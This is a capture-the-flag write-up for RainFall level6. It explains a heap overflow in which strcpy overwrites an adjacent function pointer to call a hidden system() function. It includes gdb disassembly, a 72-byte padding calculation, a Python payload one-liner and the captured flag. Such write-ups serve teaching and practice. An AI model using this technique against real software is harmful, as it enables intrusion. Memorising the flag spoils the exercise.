# Level6 — Heap Buffer Overflow / Function Pointer Overwrite

## Vulnerability

The binary allocates two adjacent heap chunks: a 64-byte data buffer and a 4-byte function pointer. It then copies user-supplied `argv[1]` into the data buffer using `strcpy()` — which has no bounds checking. By overflowing the first chunk, we can **overwrite the function pointer stored in the second chunk**, redirecting execution to `n()` which calls `system("/bin/cat /home/user/level7/.pass")`.

This is a **heap-based buffer overflow** targeting a function pointer rather than a saved return address.

---

## Recon

**Two `malloc` calls create adjacent heap chunks:**

```gdb
(gdb) disass main
   0x08048485 <+9>:   movl   $0x40,(%esp)
   0x0804848c <+16>:  call   0x8048350 <malloc@plt>   ; chunk1: 64 bytes (data buffer)
   0x08048491 <+21>:  mov    %eax,0x1c(%esp)          ; saved as ptr1

   0x08048495 <+25>:  movl   $0x4,(%esp)
   0x0804849c <+32>:  call   0x8048350 <malloc@plt>   ; chunk2: 4 bytes (function pointer)
   0x080484a1 <+37>:  mov    %eax,0x18(%esp)          ; saved as ptr2
```

**The function pointer is initialized to `m()` then called indirectly:**

```gdb
   0x080484a5 <+41>:  mov    $0x8048468,%edx          ; address of m()
   0x080484aa <+46>:  mov    0x18(%esp),%eax
   0x080484ae <+50>:  mov    %edx,(%eax)              ; *ptr2 = &m

   0x080484c5 <+73>:  call   0x8048340 <strcpy@plt>   ; strcpy(ptr1, argv[1]) ← VULNERABLE
   0x080484ca <+78>:  mov    0x18(%esp),%eax
   0x080484ce <+82>:  mov    (%eax),%eax
   0x080484d0 <+84>:  call   *%eax                    ; calls whatever *ptr2 points to
```

**`m()` just prints a string. `n()` is the target — it calls `system()`:**

```gdb
(gdb) disass n
   0x0804845a <+6>:   movl   $0x80485b0,(%esp)
   0x08048461 <+13>:  call   0x8048370 <system@plt>

(gdb) x/s 0x80485b0
0x80485b0:   "/bin/cat /home/user/level7/.pass"
```

**Offset calculation:**

The heap layout after two `malloc` calls on a 32-bit glibc:
- chunk1 starts at some address, 64 bytes of usable space
- chunk2 follows immediately after chunk1's heap metadata

Each malloc chunk has an **8-byte header** (prev_size + size), so:

```
chunk1 usable: 64 bytes
chunk1 header overhead on chunk2 side: 8 bytes
Total padding before chunk2's data: 64 + 8 = 72 bytes
```

Writing 72 bytes of padding then the address of `n()` overwrites the function pointer.

---

## Exploit

Build the payload: 72 bytes of padding followed by the little-endian address of `n()` (`0x08048454`), passed as a command-line argument:

```bash
python -c "print('A' * 72 + '\x54\x84\x04\x08')" > /tmp/exploit6
./level6 `cat /tmp/exploit6`
```

---

## Flow

```
main() malloc(64)  →  chunk1 (data buffer)
main() malloc(4)   →  chunk2 (function pointer, initialized to &m)
        │
        ▼
strcpy(chunk1, argv[1])  ←  VULNERABLE: no bounds check
        │
        ▼
argv[1] = 'A' * 72 + addr of n()
        │
        ├── 72 bytes overflow chunk1 (64 bytes) + chunk2 header (8 bytes)
        │
        └── next 4 bytes land exactly on chunk2's data  →  *ptr2 = &n
                │
                ▼
        call *ptr2  →  jumps to n() instead of m()
                │
                ▼
        n() calls system("/bin/cat /home/user/level7/.pass")
```

**Shell session after exploitation:**

```bash
level6@RainFall:~$ python -c "print('A' * 72 + '\x54\x84\x04\x08')" > /tmp/exploit6
level6@RainFall:~$ ./level6 `cat /tmp/exploit6`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## Commands Summary

```bash
# Identify the hidden function and its address
gdb ./level6
(gdb) info functions          # spot n() at 0x08048454
(gdb) disass n                # confirm system("/bin/cat /home/user/level7/.pass")
(gdb) disass main             # understand malloc layout and strcpy call

# Offset: chunk1 (64 bytes) + heap chunk header (8 bytes) = 72 bytes padding
# Then overwrite function pointer with address of n()

# Build the payload
python -c "print('A' * 72 + '\x54\x84\x04\x08')" > /tmp/exploit6

# Execute the exploit (argv[1], not stdin)
./level6 `cat /tmp/exploit6`
```
